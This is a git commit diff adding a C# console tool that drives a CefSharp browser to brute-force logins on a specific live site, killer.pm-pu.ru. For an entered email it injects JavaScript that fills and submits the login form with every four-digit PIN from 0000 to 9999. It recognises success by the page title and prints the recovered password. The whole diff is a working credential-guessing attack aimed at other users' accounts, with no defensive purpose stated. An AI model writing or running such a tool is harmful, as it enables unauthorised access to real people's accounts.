3716cfaff0a929320f5be44bb60e2876fce66d45
DeadToney <lerak01@yandex.ru>
2019-04-01 02:06:52 +0300

    Fixed start of GetPassword

---
+++ kill_pm-pu_killer/JavascriptException.cs
@@ -0,0 +1,13 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace kill_pm_pu_killer
+{
+    public class JavascriptException : Exception
+    {
+        public JavascriptException(string message) : base(message) { }
+    }
+}
--- kill_pm-pu_killer/Program.cs
+++ kill_pm-pu_killer/Program.cs
@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Collections.Specialized;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -8,8 +10,63 @@ namespace kill_pm_pu_killer
 {
     class Program
     {
+        static CefSharpWrapper wrapper = new CefSharpWrapper();
         static void Main(string[] args)
         {
+            wrapper.InitializeBrowser();
+            string email = "1";
+            while (true)
+            {
+                Console.Write("Email ('stop' for stop): ");
+                email = Console.ReadLine();
+                if (email.ToLower() == "stop") break;
+                GetPassword(email, wrapper).Wait();
+            }
+            wrapper.ShutdownBrowser();
+        }
+        private static async Task GetPassword(string email, CefSharpWrapper wrapper)
+        {
+            bool completed = false;
+            int pass;
+            for (pass = 0; pass < 10000 && !completed; pass++)
+            {
+                //string email = "lerak01@yandex.ru";
+                string password = String.Format("{0:d4}", pass);
+                Console.WriteLine(password);
+                try
+                {
+                    completed = await wrapper.GetResultAfterPageLoad("http://killer.pm-pu.ru/game_registration.php", async () =>
+                    {
+                        await wrapper.EvaluateJavascript(
+                       $@"const $emailField = document.getElementsByName('email')[0];
+                        const $passField = document.getElementsByName('password')[0];
+                        const $formAuth = document.getElementsByClassName('auth_form')[0];
+                        $emailField.value = '{email}';
+                        $passField.value = '{password}';
+                        $formAuth.submit();");
+
+                        // Ждём когда перейдёт на результаты поиска
+                        wrapper.WaitTillAddressChanges();
+
+                        // Когда страница результатов поиска полностью подгрузится, излекаем результаты
+                        return await wrapper.GetResultAfterPageLoad(wrapper.Address, async () =>
+                                await wrapper.EvaluateJavascript<bool>(
+                                    "document.title==='Заказ';"));
+                    });
+                }
+                catch
+                {
+                    pass--;
+                    Console.WriteLine($"Ошибка. Заново.");
+                    await Task.Delay(TimeSpan.FromMilliseconds(100));
+                    continue;
+                }
+            }
+            if (completed)
+                Console.WriteLine($"Пароль: {(pass - 1):d4}");
+            else
+                Console.WriteLine($"Похоже пользователя с таким email не существует!");
         }
     }
 }
+
